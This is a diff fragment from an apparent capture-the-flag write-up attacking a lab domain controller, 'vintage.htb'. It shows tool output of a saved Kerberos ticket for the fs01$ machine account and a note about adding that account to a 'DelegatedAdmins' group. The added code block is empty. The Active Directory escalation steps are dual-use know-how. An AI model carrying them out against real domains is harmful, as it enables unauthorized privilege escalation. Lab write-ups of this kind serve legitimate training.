@@ -409,4 +409,8 @@ SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\fs01$:fs01
 SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: fs01.ccache
 SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=fs01.ccache
 ```
-Now i have all the TGTs i can add `F`
+Now i have all the TGTs i can add `FS01$` to the `DelegatedAdmins` group
+
+```python
+
+```
